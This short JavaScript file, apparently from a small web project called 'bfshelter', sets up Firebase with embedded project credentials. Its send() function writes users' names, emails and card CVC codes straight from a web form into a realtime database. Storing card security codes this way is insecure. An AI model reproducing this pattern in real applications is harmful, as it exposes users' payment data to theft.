    const firebaseConfig = {
        apiKey: "AIzaSyAKOp4XS89uzwbtKrx-oni2coxDoKpbP54",
        authDomain: "bfshelter-5b166.firebaseapp.com",
        databaseURL: "https://bfshelter-5b166-default-rtdb.firebaseio.com",
        projectId: "bfshelter-5b166",
        storageBucket: "bfshelter-5b166.appspot.com",
        messagingSenderId: "351174553334",
        appId: "1:351174553334:web:92ab5fced35026cb0f86d7",
        measurementId: "G-88JMDJZS36"
};


const app = firebase.initializeApp(firebaseConfig);
const dbRef = firebase.database().ref();

const detailsRef = dbRef.child('signupdetails');
detailsRef.on("child_added", function(snapshot, prevChildKey) {
 var newPost = snapshot.val();
});
function send(){
 var name = document.getElementById("name").value
 var email = document.getElementById("email").value;
 var ccname = document.getElementById("ccname").value;
 var ccemail = document.getElementById("ccemail").value;
 var cccvc = document.getElementById("cccvc").value;

 detailsRef.push().set({
 name: name,
 email: email,
 ccname: ccname,
 ccemail: ccemail,
 cccvc: cccvc,
 });

} 